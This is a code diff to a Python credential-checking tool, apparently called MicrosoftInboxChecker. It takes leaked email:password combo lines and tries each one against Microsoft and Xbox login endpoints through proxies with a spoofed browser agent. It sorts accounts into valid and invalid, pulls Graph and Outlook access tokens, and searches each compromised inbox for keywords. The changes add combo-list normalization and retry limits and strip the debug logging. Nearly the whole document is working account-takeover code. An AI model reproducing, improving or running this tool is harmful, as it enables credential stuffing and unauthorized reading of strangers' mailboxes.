@@ -11,14 +11,11 @@ from urllib3.util.retry import Retry
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ══════════════════════════════════════════
-#  KONFIG
+#  KONFIG (az eredeti CONFIG['timeout'] helyett)
 # ══════════════════════════════════════════
 TIMEOUT = 15
-DEBUG = True  # True = kiírja a hibákat konzolra/Render logba
+MAX_RETRIES = 3
 
-def log(msg):
-    if DEBUG:
-        print(f"[CHECKER] {msg}")
 
 def format_proxy(proxy):
     if not proxy:
@@ -33,6 +30,7 @@ def format_proxy(proxy):
         return f"http://{proxy}"
     return f"http://{proxy}"
 
+
 def format_last_date(date_str):
     if not date_str or date_str == "N/A":
         return "N/A"
@@ -44,6 +42,21 @@ def format_last_date(date_str):
         return dt.strftime("%Y-%m-%d %H:%M")
     except Exception:
         return date_str
+
+
+def normalize_combo(line):
+    line = line.strip()
+    if not line:
+        return None
+    for sep in [':', '|', ';', ',', '\t', ' ']:
+        if sep in line:
+            parts = line.split(sep, 1)
+            email = parts[0].strip()
+            pw = parts[1].strip()
+            if email and pw and '@' in email:
+                return f"{email}:{pw}"
+    return None
+
 
 def create_optimized_session():
     session = requests.Session()
@@ -72,6 +85,8 @@ class MicrosoftInboxChecker:
         self.session = create_optimized_session()
         if proxy:
             self.session.proxies = {'http': proxy, 'https': proxy}
+        self.access_token = None
+        self.cid = None
         self.country = None
         self.name = None
         self.sFTTag_url = (
@@ -83,7 +98,8 @@ class MicrosoftInboxChecker:
         )
 
     def get_urlPost_sFTTag(self):
-        for _ in range(3):
+        attempts = 0
+        while attempts < MAX_RETRIES:
             try:
                 headers = {
                     'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
@@ -109,13 +125,15 @@ class MicrosoftInboxChecker:
                     if match2:
                         urlPost = match2.group(1).replace('&amp;', '&')
                         return urlPost, sFTTag
-            except Exception as e:
-                if DEBUG: log(f"sFTTag error: {e}")
+            except Exception:
+                pass
+            attempts += 1
             time.sleep(0.5)
         return None, None
 
     def get_xbox_rps(self, urlPost, sFTTag):
-        for _ in range(3):
+        tries = 0
+        while tries < MAX_RETRIES:
             try:
                 data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                 headers = {
@@ -161,15 +179,15 @@ class MicrosoftInboxChecker:
                     'help us protect your account'
                 ]):
                     return 'BAD'
-            except Exception as e:
-                if DEBUG: log(f"Xbox RPS error: {e}")
+            except Exception:
+                pass
+            tries += 1
             time.sleep(0.5)
         return 'BAD'
 
     def login(self):
         urlPost, sFTTag = self.get_urlPost_sFTTag()
         if not urlPost or not sFTTag:
-            if DEBUG: log("Failed to get sFTTag/urlPost")
             return 'BAD'
         return self.get_xbox_rps(urlPost, sFTTag)
 
@@ -188,8 +206,7 @@ class MicrosoftInboxChecker:
                 parsed_fragment = parse_qs(urlparse(r.url).fragment)
                 token = parsed_fragment.get('access_token', [None])[0]
             return token
-        except Exception as e:
-            if DEBUG: log(f"Graph token error: {e}")
+        except Exception:
             return None
 
     def get_profile_via_graph(self, token):
@@ -277,8 +294,8 @@ class MicrosoftInboxChecker:
                                         keyword_dates[f"{keyword}(body)"] = format_last_date(data2['value'][0].get('receivedDateTime', 'N/A'))
                         except Exception:
                             pass
-            except Exception as e:
-                if DEBUG: log(f"Graph inbox error for {keyword}: {e}")
+            except Exception:
+                pass
         return total_found_sum, found_info, keyword_dates
 
     def check_inbox(self):
@@ -351,8 +368,8 @@ class MicrosoftInboxChecker:
                             if date_end != -1:
                                 last_date = search_text[date_start:date_end]
                         keyword_dates[keyword] = format_last_date(last_date)
-            except Exception as e:
-                if DEBUG: log(f"Substrate inbox error for {keyword}: {e}")
+            except Exception:
+                pass
         return total_found_sum, found_info, keyword_dates
 
     def get_access_token_for_outlook(self):
@@ -370,6 +387,5 @@ class MicrosoftInboxChecker:
                 parsed_fragment = parse_qs(urlparse(r.url).fragment)
                 token = parsed_fragment.get('access_token', [None])[0]
             return token
-        except Exception as e:
-            if DEBUG: log(f"Outlook token error: {e}")
+        except Exception:
             return None
